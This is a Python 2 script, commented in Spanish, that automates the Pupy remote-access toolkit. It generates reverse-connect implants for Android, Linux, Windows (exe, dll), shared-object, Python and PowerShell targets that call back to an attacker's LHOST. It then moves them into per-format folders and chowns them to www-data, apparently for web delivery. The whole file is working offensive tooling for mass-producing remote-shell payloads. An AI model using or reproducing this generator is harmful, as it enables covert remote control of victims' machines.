# -*- coding: utf-8 -*-
import os
import subprocess
import re
import shutil
import sys
from os import listdir
from config_paths import *

main_save_path = main_path+"pupy/"
payloads = ["apk","lin_x86","lin_x64","so_x86","so_x64","exe_x86","exe_x64","dll_x86","dll_x64","py","pyinst","ps1"]
pre_pupy = ["pupy.apk","pupyx64.dll","pupyx86.dll","pupyx64.exe","pupyx86.exe","pupyx64.lin","pupyx86.lin","payload.ps1","payload.py","pupyx64.so","pupyx86.so"]

def create_dir(directorio):
    create_dir_path = main_save_path + directorio
    if not os.path.exists(create_dir_path): os.makedirs(create_dir_path)

def main_directory():
    if os.path.exists(main_save_path):
        shutil.rmtree(main_save_path)
    os.makedirs(main_save_path)

#Elimina archivos de pupy ya creados en el directorio original, pues si estan creados al ppio el programa no vera que se crean de nuevo
def initialFiles():
    for archivo in listdir("./"):
        if archivo in pre_pupy:
            os.remove(archivo)
    return listdir("./")

def move(payload):
    files = listdir("./")
    for archivo in files:
        if not archivo in ini_files:
            os.rename(archivo, main_save_path+payload+"/"+archivo)
            break

def pupy(payload):
    comando = "./pupygen.py -f "+ payload +" connect --host "+LHOST
    try:
        print comando
        subprocess.check_output(comando, shell=True)
        move(payload)
    except subprocess.CalledProcessError as e:
        print "Couldn't create payload: "+payload

###############
## MAIN PART ##
###############
print ""
print "#################################################"
print "PUPY:"
if len(sys.argv) > 1:
    if ip_validator(sys.argv[1]):
        LHOST = sys.argv[1]
    else:
        print "Give a correct Ip address"
        exit(-1)
else:
    LHOST = autoLHOST()
    print "Using IP: "+LHOST


print "Default PUPY's port is 443, change it in pupy.conf"
main_directory()
os.chdir(pupy_path+"/pupy") #El pupy_gen.py está en GIT/Pupy/pupy
ini_files = initialFiles()
for payload in payloads:
    print ""
    print "#################################################"
    print "CREATING PAYLOAD: "+payload
    print "-------------------------------------------------"
    create_dir(payload)

    pupy(payload)
    print "_________________________________________________"

os.system("chown www-data -R "+main_save_path)
